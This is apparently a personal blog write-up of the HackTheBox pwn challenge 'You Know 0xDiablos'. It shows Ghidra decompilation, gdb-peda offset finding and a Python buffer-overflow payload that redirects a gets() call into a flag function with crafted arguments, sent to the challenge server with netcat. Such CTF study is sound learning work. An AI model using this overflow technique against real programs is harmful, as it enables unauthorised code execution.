---
title: HackTheBox - Pwn - You Know 0xDiablos
date: 2022-03-01 12:00:00 +/- 0000
categories: [HackTheBox,Pwn,BinaryExploit]
author: Connor Weeks-Pearson
tags: [pwn,0xdiablos]
image: /assets/img/Icons/pwn/pwn.png
---

I've never done a binary exploit here on HTB, the first exposure i had to them was at university yeara ago, but it's always something i've found interesting, so here goes! I will be using google for help because how else am i  going to learn!

Description: I missed my flag

*** IP: 139.59.183.98:32124 ***
*** Files: 1 - vuln ***

---

## Analysis

First thing lets discover the type of file `vuln` is:

<pre>
┌──(kali㉿kali)-[~/Desktop]
└─$ file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped

</pre>

`vuln` is an ELF 32-bit executable. Executing the file, the programme outputs some  text and then waits for a reply. It then redirects the input to the output.

<pre>┌──(kali㉿kali)-[~/Desktop]
└─$ ./vuln
You know who are 0xDiablos: 
test 
test
</pre>

Now it's time to use ghidra!

---

## Ghidra

Having never used ghidra before this was very fun! After loading the file into Ghidra,  i had a look at the different functions. Of these, 3 stood out: vuln, flag and main. 

<div style="page-break-after: always;"></div>

### vuln()

```c++
void vuln(void)

{
  char local_bc [180];
  
  gets(local_bc);
  puts(local_bc);
  return;
}
```

So what we can see here is there is an allocated 180 character array, that will hold the input using `gets` and then print it. After some googling, gets was replaced with fgets due to buffer overflow attacks.

### flag()

```c++
void flag(int param_1,int param_2)

{
  char local_50 [64];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 != (FILE *)0x0) {
    fgets(local_50,0x40,local_10);
    if ((param_1 == -0x21524111) && (param_2 == -0x3f212ff3)) {
      printf(local_50);
    }
    return;
  }
  puts("Hurry up and try in on server side.");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

This function is a bit different. A char array size of 64 is allocated as `local_50`, reads the file "flag.txt" and saves it to `local_50`. If function params are the same as `0x21524111` and `0x3f212ff3`, it will print the content of `local_50`.

The assembly code for 0x21524111 is `0xdeadbeef` and 0x3f212ff3 is `0xc0ded00d`.

---

## Exploiting
I will be using gdp-peda to exploit the `gets` function using a buffer overflow to jump into `flag()` to get the flag. Lets load the file, and start. We should hit an automatic breakpoint.

```assembly
gdb-peda$ start
[----------------------------------registers-----------------------------------]                                                                          
EAX: 0xf7fb1a28 --> 0xffffd1ec --> 0xffffd3c1 ("COLORFGBG=15;0")
EBX: 0x0 
ECX: 0xffffd140 --> 0x1 
EDX: 0xffffd174 --> 0x0 
ESI: 0xf7faf000 --> 0x1e9d6c 
EDI: 0xf7faf000 --> 0x1e9d6c 
EBP: 0xffffd128 --> 0x0 
ESP: 0xffffd120 --> 0xffffd140 --> 0x1 
EIP: 0x80492c0 (<main+15>:      sub    esp,0x10)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)                                                                           
[-------------------------------------code-------------------------------------]                                                                          
   0x80492bc <main+11>: mov    ebp,esp
   0x80492be <main+13>: push   ebx
   0x80492bf <main+14>: push   ecx
=> 0x80492c0 <main+15>: sub    esp,0x10
   0x80492c3 <main+18>: call   0x8049120 <__x86.get_pc_thunk.bx>
   0x80492c8 <main+23>: add    ebx,0x2d38
   0x80492ce <main+29>: mov    eax,DWORD PTR [ebx-0x4]
   0x80492d4 <main+35>: mov    eax,DWORD PTR [eax]
[------------------------------------stack-------------------------------------]                                                                          
0000| 0xffffd120 --> 0xffffd140 --> 0x1 
0004| 0xffffd124 --> 0x0 
0008| 0xffffd128 --> 0x0 
0012| 0xffffd12c --> 0xf7de3fd6 (<__libc_start_main+262>:       add    esp,0x10)
0016| 0xffffd130 --> 0xf7faf000 --> 0x1e9d6c 
0020| 0xffffd134 --> 0xf7faf000 --> 0x1e9d6c 
0024| 0xffffd138 --> 0x0 
0028| 0xffffd13c --> 0xf7de3fd6 (<__libc_start_main+262>:       add    esp,0x10)
[------------------------------------------------------------------------------]                                                                          
Legend: code, data, rodata, value

Temporary breakpoint 1, 0x080492c0 in main ()
```

Knowing there is a 180 character buffer, i created a file containing 200 characters and saved it as in.txt, which will be used to discover the EIP offset.

```as
db-peda$ pattern_create 200 in.txt
Writing pattern of 200 chars to filename "in.txt"
gdb-peda$ r < in.txt
Starting program: /home/kali/Desktop/vuln < in.txt
You know who are 0xDiablos: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]                                                                          
EAX: 0xc9 
EBX: 0x76414158 ('XAAv')
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7faf000 --> 0x1e9d6c 
EDI: 0xf7faf000 --> 0x1e9d6c 
EBP: 0x41594141 ('AAYA')
ESP: 0xffffd110 ("ZAAxAAyA")
EIP: 0x41417741 ('AwAA')
...
```

We can see the EIP address is `0x41417741`, so lets find the offset, so that we can control the EIP.

```as
gdb-peda$ pattern_offset 0x41417741
1094809409 found at offset: 188
```

Now lets get the address of `flag()`

```assembly
gdb-peda$ disas flag
Dump of assembler code for function flag:
   0x080491e2 <+0>:     push   ebp
   0x080491e3 <+1>:     mov    ebp,esp
   0x080491e5 <+3>:     push   ebx
   0x080491e6 <+4>:     sub    esp,0x54
   0x080491e9 <+7>:     call   0x8049120 <__x86.get_pc_thunk.bx>
...
```

The address is 0x080491e2, which will translate to `\xe2\x91\x04\x08`

## Python Buffer Overflow

I will be using python to try and jump into the function `flag()`

```shell-session
┌──(kali㉿kali)-[~/Desktop]
└─$ python -c "print('A'*188 + '\xe2\x91\x04\x08')" | ./vuln           139 ⨯
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Hurry up and try in on server side.
```



It successfully jumped into the code function. Now i know i need to pass the args into the function, and so some googling commenced. I read about `DUMB` addresses, in which the arguements called need to be supplied in reverse order. These parameters  are 0xdeadbeef and 0xc0ded00d, which when reversed turns into:

`\xef\xbe\xad\xde\x0d\xd0\xde\xc0`

This turns the entire python script into:

`python -c "print('A'*188 + '\xe2\x91\x04\x08' + 'AAAA\xef\xbe\xad\xde\x0d\xd0\xde\xc0')" | > exploit.txt`

## Deploying the Exploit
All that is needed now is to deploy the exploit to the docker server using netcat. This was done by the following:

```shell-session
┌──(kali㉿kali)-[~/Desktop]
└─$ cat exploit.txt | nc 139.59.183.98 32124
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�DUMBﾭ�
HTB{flag}  
```
